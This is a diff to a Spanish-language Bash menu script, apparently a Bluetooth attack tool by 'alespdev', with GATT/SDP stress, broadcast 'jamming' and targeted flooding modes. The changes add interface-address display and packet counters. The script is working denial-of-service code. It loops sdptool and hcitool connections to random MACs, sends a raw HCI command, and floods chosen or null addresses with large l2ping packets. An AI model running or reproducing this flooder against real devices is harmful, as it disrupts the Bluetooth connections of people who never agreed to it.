@@ -15,6 +15,7 @@ BOLD='\033[1m'
 NC='\033[0m'
 
 INTERFACE=""
+INTERFACE_ADDR=""
 
 
 draw_line() {
@@ -49,11 +50,15 @@ menu_b() {
 
 
 select_iface() {
+
+    local valid=false
+
     draw_header
     draw_subheader "CONFIGURACION DE HARDWARE"
     
-    echo -e "${WHITE}Interfaces detectadas:${NC}"
-    hciconfig | grep "hci" | cut -d: -f1,2 | sed 's/^/  / '
+    echo -e "${WHITE}Interfaces Bluetooth detectadas:${NC}"
+    hciconfig | awk '/hci[0-9]/ {iface=$1} /BD Address:/ {print "  ~ " iface " \t[" $3 "]"}' | sed 's/://'
+    draw_line
     
     echo -e "\n${WHITE}Escribe la interfaz (ej. hci0):${NC}"
     echo -ne "${BLUE}>> ${NC}"
@@ -61,7 +66,9 @@ select_iface() {
 
     if hciconfig | grep -q "$input_iface"; then
         INTERFACE=$input_iface
+        valid=true
         echo -e "${GREEN}[OK] Interfaz $INTERFACE configurada.${NC}"
+        INTERFACE_ADDR=$(hciconfig $INTERFACE | grep "BD Address" | awk '{print $3}')
         sleep 1
     else
         echo -e "${RED}[ERROR] Interfaz no válida.${NC}"
@@ -82,9 +89,12 @@ reset_bt() {
 }
 
 gatt_stress() {
+
+    local reqs=0
+
     draw_header
     draw_subheader "MODO: GATT/SDP STRESS"
-    echo -e "${WHITE}IFACE:${NC} ${CYAN}$INTERFACE${NC} | ${WHITE}DEV:${NC} ${RED}alespdev${NC}"
+    echo -e "${WHITE}IFACE:${NC} ${CYAN}$INTERFACE $INTERFACE_ADDR${NC} | ${WHITE}DEV:${NC} ${RED}alespdev${NC}"
     draw_line
     echo -e "${YELLOW}[INFO] Ctrl+C para detener.${NC}"
     reset_bt
@@ -92,28 +102,37 @@ gatt_stress() {
         RAND_MAC=$(printf '00:%02X:%02X:%02X:%02X:%02X' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
         sdptool -i $INTERFACE browse $RAND_MAC > /dev/null 2>&1 &
         hcitool -i $INTERFACE cc $RAND_MAC > /dev/null 2>&1 &
+        ((reqs++))
         echo -ne "${RED}[#] INUNDANDO SERVICIOS... [X] \r${NC}"
+        echo -ne "${YELLOW}[*] Peticiones enviadas... [${WHITE}$reqs${YELLOW}] \r${NC}"        
         sleep 0.05
     done
 }
 
 broadcast_jam() {
+    
+    local pkts=0
+
     draw_header
     draw_subheader "MODO: BROADCAST JAMMING"
-    echo -e "${WHITE}IFACE:${NC} ${CYAN}$INTERFACE${NC} | ${WHITE}DEV:${NC} ${RED}alespdev${NC}"
+    echo -e "${WHITE}IFACE:${NC} ${CYAN}$INTERFACE $INTERFACE_ADDR${NC} | ${WHITE}DEV:${NC} ${RED}alespdev${NC}"
     draw_line
     echo -e "${YELLOW}[INFO] Ctrl+C para detener.${NC}"
     reset_bt
     while true; do
         hcitool -i $INTERFACE cmd 0x01 0x0001 0x33 0x8b 0x9e 0x01 0x00 > /dev/null 2>&1
         l2ping -i $INTERFACE -c 10 -f -s 640 00:00:00:00:00:00 > /dev/null 2>&1 &
+        ((pkts+=10))
         echo -ne "${YELLOW}[#] SATURANDO ESPECTRO... [====] \r${NC}"
+        echo -ne "${YELLOW}[*] Paquetes enviados... [${WHITE}$pkts${YELLOW}] \r${NC}"
+
         sleep 0.05
     done
 }
 
 target_jam() {
     local mac=""
+    local pkts=0
     
     while true; do
         draw_header
@@ -132,21 +151,24 @@ target_jam() {
 
     draw_header
     draw_subheader "MODO: TARGETED JAMMING"
-    echo -e "${WHITE}OBJ:${NC} ${RED}$mac${NC} | ${WHITE}IFACE:${NC} ${CYAN}$INTERFACE${NC} | ${WHITE}DEV:${NC} ${RED}alespdev${NC}"
+    echo -e "${WHITE}OBJ:${NC} ${RED}$mac${NC} | ${WHITE}IFACE:${NC} ${CYAN}$INTERFACE  $INTERFACE_ADDR${NC} | ${WHITE}DEV:${NC} ${RED}alespdev${NC}"
     draw_line
     echo -e "${YELLOW}[INFO] Ctrl+C para detener.${NC}"
     reset_bt
     
     while true; do
         l2ping -i $INTERFACE -f -s 640 $mac > /dev/null 2>&1
+        ((pkts++))
         echo -ne "${YELLOW}[#] ATACANDO OBJETIVO... [====] \r${NC}"
+        echo -ne "${YELLOW}[*] Paquetes enviados... [${WHITE}$pkts${YELLOW}] \r${NC}"
         sleep 0.05
     done
 }
 
 menu() {
+
     draw_header
-    echo -e "${WHITE}INTERFAZ ACTIVA:${NC} ${CYAN}${BOLD}$INTERFACE${NC}"
+    echo -e "${WHITE}INTERFAZ ACTIVA:${NC} ${CYAN}${BOLD}$INTERFACE $INTERFACE_ADDR${NC}"
     draw_line
     echo -e "${GREEN}OPCIONES DISPONIBLES:${NC}"
     echo -e ""
@@ -161,6 +183,8 @@ menu() {
     echo -e "${WHITE}Dev: ${RED}alespdev${NC}"
     echo -ne "${BLUE}>> Selección: ${NC}"
     read opt
+
+    
 
     case $opt in
         1) broadcast_jam ;;
